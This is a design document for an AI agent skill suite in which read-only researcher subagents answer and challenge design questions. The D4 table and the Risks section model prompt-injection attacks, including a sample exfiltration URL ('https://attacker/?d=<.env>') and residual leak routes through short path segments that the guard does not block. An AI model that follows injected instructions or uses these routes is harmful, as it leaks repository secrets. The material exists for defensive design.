@@ -1,0 +1,120 @@
+# Design
+
+## Context
+
+See proposal.md (Why). Relevant current state:
+
+- Skills live in `skills/<name>/SKILL.md` plus helper scripts. `install.sh` copies each skill into six folders (Claude, Cursor, `~/.agents`, `$CODEX_HOME`, OpenCode, Gemini), with one `install_<x>_skill` function, a `--skip-<x>` flag, an uninstall block and a verify block per skill (see `/opsx-review`, `/opsx-task`).
+- Agents live in `agents/opsx-<name>.md` (Claude frontmatter). `install.sh` converts them per CLI:
+  - `install_claude_agent`: rewrites `model:`;
+  - `install_cursor_agent`: name, description and model only;
+  - `install_codex_agent`: TOML with `developer_instructions`;
+  - `install_opencode_agent`: a fixed permission block that **allows** `edit` and `bash`;
+  - Gemini gets the source file copied as is.
+  
+  None of these converters can express "read-only" today.
+- `/opsx-task` already resolves ticket keys (`opsx-task.sh key`) and documents how to read tickets through the tracker MCP under the project's scoping rules.
+- `/opsx-pr` already defines the Untrusted input rules and the split between CLIs: Claude Code, Cursor and OpenCode use subagents; Codex and Gemini do the work in the parent.
+
+## Goals / Non-Goals
+
+**Goals:**
+- One engine, three entry points, so answer, challenge and settle share the brief format, verdict format, validation rules and state.
+- Every deterministic rule (extraction, citation check, round state) lives in `questions.sh`, so it is testable without an LLM and checkable by evals.
+- Read-only enforced by tool configuration on every CLI that runs subagents, not only by prompt.
+
+**Non-Goals:**
+- No new model key: `ops-researcher` is installed as `inherit` and `agents/models.conf` and the `agent-models` capability stay unchanged. It can be added later if a different model for the challengers turns out to be useful.
+- No persistent cross-run question ledger. The run directory under `.opsx/questions/` is per run, and the design.md `Resolved:` bullets and memory entries are the durable record.
+- No automatic tracker or memory writes, ever, and no posting of ticket comments.
+- No extraction from arbitrary code (`TODO`/`FIXME` scanning). Questions from code come in as free text or from the conversation.
+
+## Decisions
+
+### D1. A shared `skills/opsx-questions/` plus three thin skills
+`skills/opsx-questions/` holds:
+
+- `questions.sh`;
+- `reference.md`: brief fields, untrusted-input rules, verdict format, validation and downgrade rules, report format.
+
+`opsx-answer`, `opsx-challenge` and `opsx-settle` are short SKILL.md files. Each locates `questions.sh` and `reference.md` and adds only what differs for its mode.
+
+A skill cannot portably call another skill across five CLIs, so "settle uses answer and challenge" is implemented as shared reference text, not as nested skill calls. A single skill with a mode argument was the alternative. Three names trigger better from natural language ("challenge this decision") and match the user's request.
+
+### D2. `questions.sh` subcommands
+- `extract '<change>' --mode answer|challenge [--include-requirements]` prints TSV (`id kind path:line text`). It is a section-aware awk over `design.md`, `proposal.md` and the change's `specs/**/spec.md`. It covers only change inputs. Other inputs are extracted by the parent, which writes the same TSV.
+- `cite <path> <line> <excerpt>` checks a ±2-line window with collapsed whitespace. Paths are resolved with `realpath -m` and must stay under the repo top level or `~/.agents/memory`. Exit codes 0/1/2/3.
+- `run new <mode> --questions-file <tsv> [--max] [--rounds]` creates `.opsx/questions/<YYYYmmdd-HHMMSS>-<rand4>/` with `questions.tsv`, `meta` (mode, rounds cap) and an empty `verdicts.tsv`. It adds `.opsx/questions/` to `.gitignore` once, as `opsx-task.sh` does for `.opsx/tasks/`.
+- `record <run> <qid> --round k --stage s --verdict v [--sources n]` validates and appends a line to `verdicts.tsv`.
+- `status <run>` replays `verdicts.tsv` through the state machine below. The state is derived from the log, never stored, so a half-written run cannot leave an inconsistent state. Its last line, `coverage rounds=<k> subagents=<n> dropped=<d> incomplete=yes|no input=<path|->`, comes from `meta`.
+- The coverage check (D7) runs before the run exists, so `run new` takes its outcome as flags (`--coverage-rounds-run`, `--coverage-subagents`, `--coverage-dropped`, `--coverage-incomplete`, `--input`) and writes them to `meta`; the report's subagent count is then the sum of `subagents=` in `status`, recoverable from `.opsx/questions/`.
+
+URLs are not fetched by the script. The parent checks `url:` evidence with its own web tool, because a shell `curl` of a URL proposed by a subagent is exactly what the untrusted-input rules forbid.
+
+### D3. The settle state machine
+
+```
+             answer: needs-human / unanswerable
+   open(k) -------------------------------------------> needs-human | unanswerable
+   (kind open)
+     |
+     | answer: answered / partial
+     v
+   challenging(k) --(A,B both recorded)--+   <-- start for a decision or requirement (kind decision, req-spec, req-client)-- both stands, sources>=1 --> settled
+         ^                               |
+         |  no attack won, but a stands  +-- any weakened/invalidated --> open(k+1)    | contested   (k = cap)
+         +-- had 0 sources --------------+-- (untested)               --> challenging(k+1) | needs-human (k = cap)
+```
+
+A question of kind `open` starts in `open`. A decision or a requirement (`--include-requirements`) is already a claim, so it starts in `challenging` with its own text as the answer under attack; a successful attack then makes it `open` in round `k+1`, and the answer brief asks for a revised or defended claim that meets the attack.
+
+Both challengers run in the same round, in parallel. That satisfies "two independent challenges" without forcing a second round on a sound answer. Independence comes from different briefs and source scopes (A internal, B external) and from neither seeing the other.
+
+### D4. `ops-researcher` read-only per CLI
+| CLI | How read-only is enforced |
+|---|---|
+| Claude Code | `tools: [Read, Glob, Grep, WebSearch, WebFetch]`. `permissionMode: bypassPermissions` avoids WebFetch prompts in a fan-out; no write tool is listed. Read plus WebFetch under bypass is an exfiltration path (an injected page asks for `https://attacker/?d=<.env>`), so a frontmatter `PreToolUse` hook on `WebFetch` runs `opsx-questions/webfetch-guard.sh` (install.sh writes its absolute path, as for `monitor-guard.sh`), which applies `questions.sh url` and blocks (exit 2, also under bypass) any URL with a query string, userinfo, port, IP or local host, or a path segment over 64 characters, and fails closed on an unreadable payload. |
+| Cursor | frontmatter `readonly: true` (new optional argument to `install_cursor_agent`) |
+| Codex | `[features]` `shell_tool`, `apps`, `plugins`, `memories` = false in the TOML (new optional argument to `install_codex_agent`). Verified during apply: `sandbox_mode` in an agent file does not override the parent session, and no key removes file edits, so Codex cannot make the agent fully read-only (README gap; Codex researches in the parent anyway) |
+| OpenCode | a read-only permission block: `edit`, `bash`, `task`, `todowrite` deny; `read`, `glob`, `grep`, `list`, `webfetch`, `websearch` allow (new `install_opencode_agent` variant) |
+| Gemini | the copied file gets `tools:` rewritten to Gemini's read and web tool names (`read_file`, `read_many_files`, `glob`, `grep_search`, `list_directory`, `google_web_search`, `web_fetch`) |
+
+The researcher gets **no MCP tools**. Tracker MCP servers mix read and write tools under per-install names, so a safe allow-list cannot be written portably. The parent reads tickets, runs `req.sh` and `graphify query`, and passes excerpts in the brief (spec: "Briefs carry the evidence the agent cannot fetch"). The cost is that a researcher cannot search the tracker by itself. Challenger A gets the linked tickets the parent collected.
+
+The Cursor `readonly` key, the Codex agent keys and the Gemini tool names come from those CLIs' documentation. None of these CLIs is installed here, so task 3.x checks them against the docs (Context7 or web) before relying on them. Tests check the generated files, not the CLIs.
+
+### D5. Validation is in the parent, mechanical first
+For each result: parse `VERDICT:` and the evidence lines, run `questions.sh cite -- …` for each `file:` item (strict arguments: `-h` in a value is a value, so a fabricated citation cannot exit 0 through the help path), run `questions.sh url -- '<url>'` for each `url:` item and fetch only what passes (a URL that could carry data the subagent encoded is dropped unfetched), compare `ticket:` and `req:` items against what the parent read, and drop failures. Then judge, and apply the downgrade rules, before `record`. `--sources` is the number of evidence items that survived. The parent records validated verdicts only, so `status` reflects validation.
+
+A malformed result (no `VERDICT:` line or an unknown verdict) is retried once with the same brief. A second malformed result is recorded as `needs-human` (answer) or `stands` with 0 sources (challenge). Either way the verdict is recorded with `--attempts 2`, so `subagents=` in `status` counts the retry.
+
+### D6. Conversation input
+With no argument, the parent itself lists the open questions (answer, settle) or the decisions taken (challenge) from the conversation, writes the TSV with kind `open` or `decision` and source `conversation`, and continues as for any input. Subagents never see the conversation, only the briefs.
+
+### D7. Coverage check before confirmation
+Extraction (by `questions.sh extract` or by the parent) can miss questions: a decision written as prose, an open point in a ticket comment, an intention the user stated in the conversation but no artifact records. So between extract and the user's confirmation, the parent runs a coverage loop:
+
+1. Save the input the subagent cannot read (ticket text, free text, the user's request and the relevant conversation turns) with `questions.sh input save` to `.opsx/questions/input-<stamp>/input.md`, cited by line number (the file holds the text verbatim, without line-number prefixes, so `cite` matches it; tabs and carriage returns become spaces, other control characters (C0, DEL and UTF-8 C1) are stripped, input over 1 MiB is refused). The parent writes the text to a file with its file-write tool and feeds it on stdin (`input save < file`), never inside a shell argument or heredoc, since the text is untrusted. A change or file input is cited where it lives.
+2. Start a fresh `ops-researcher` with a coverage brief: the stance `coverage`, the mode and its kinds as the reference's coverage brief defines them (answer: `open`; challenge: `decision`; settle: `open`; challenge and settle with `--include-requirements` also `req-spec` and `req-client`), the current list, the input path (or excerpts), and the untrusted-input rules. It returns `VERDICT: covered` or `VERDICT: gaps`, then one `gap: <kind> "<text>"` line per missing item, each followed by one evidence item (`file:` for a change, file or saved input; `ticket:` or `req:` as usual).
+3. Validate each gap like any evidence (`cite --` for `file:`), drop a gap whose citation fails, and drop one that duplicates an item already in the list (same source line, or the parent judges it the same question, naming the item it duplicates). Add the rest with the next free ids and source `coverage:<round>`.
+4. Repeat with a new subagent on the grown list until a round leaves no surviving gap, or until `--coverage-rounds` (default 3). At the cap with gaps still arriving, the list is shown with the note `coverage incomplete after N rounds`. A malformed coverage result is retried once; a second one ends the loop with the same note. The outcome (rounds run, coverage subagents with retries, gaps dropped, the incomplete note, the saved input path) is passed to `run new` and kept in the run's `meta` (D2).
+
+The checker is reused `ops-researcher`, not a new agent: a new agent would need read-only wiring and tests on five CLIs for the same tool set. A fresh subagent per round, which never sees earlier coverage results, keeps each round independent of the last. Every gap is untrusted subagent output that can steer the whole run, so a gap without a surviving citation never enters the list. The coverage pass writes nothing outside `.opsx/questions/`. `--max` still applies at confirmation: if gaps push the list over it, the existing ordering rule proposes the first `--max` and names the rest. On Codex and Gemini the parent does the coverage pass itself, which is weaker (it checks its own extraction); the read-only notice already covers this.
+
+## Risks / Trade-offs
+
+- [Prompt injection exfiltrates repository data through a URL] → Claude Code: the researcher's WebFetch hook and the parent's `questions.sh url` check refuse query strings, userinfo, ports, IP and local hosts and long opaque path segments. Accepted residual: data split into short (also percent-encoded) path segments of an attacker-owned domain, and WebSearch queries (they reach the search provider, not an attacker host), are not blocked mechanically; the researcher's rules forbid putting file contents into a URL or query, and the parent shows every fetched URL in the report. Cursor, OpenCode and Gemini have no equivalent hook here (their read-only modes still allow web fetches); Codex researches in the parent.
+- [Hostile repository symlinks] → `extract` skips a symlinked change directory, design.md, proposal.md or spec.md; `cite` resolves symlinks before the confinement check.
+
+- [The challenger always finds something] → Verdicts need surviving citations, the downgrade rules apply, and the parent can reject an attack only by naming a concrete flaw. The report shows what was dropped, so the user sees the filtering.
+- [The parent defends its own decisions when validating a conversation challenge] → The concrete-flaw rule, and the report shows rejected attacks with the stated flaw, so the user can overrule.
+- [Cost: up to 54 subagents with the defaults, plus up to 3 coverage subagents] → `--max 6`, `--coverage-rounds` and the list confirmation step. Questions that are already final do not run again. The report prints the count.
+- [Read-only is lost on Codex and Gemini, where the parent researches] → Said at the start of the run and in the README. The parent is still bound by the write-only-on-command rule.
+- [CLI frontmatter keys for read-only (Cursor `readonly`, Codex `sandbox_mode`, Gemini tool names) may differ from the docs] → Verified against docs during apply, and recorded in the README if a CLI cannot express it.
+- [Prompt injection from web pages or tickets] → No write or shell tools in the researcher, untrusted-input rules in every brief, and the parent never runs a command or opens a URL just because a result suggests it. URL evidence is fetched only to check the excerpt.
+
+- [The coverage checker keeps inventing loosely related gaps] → each gap needs a surviving citation in the input, duplicates are dropped, the loop is capped, and the user still confirms or removes items.
+
+## Migration Plan
+
+Additive. Re-run `install.sh`. `--skip-questions` opts out, and `--uninstall` removes the skills and agent files.
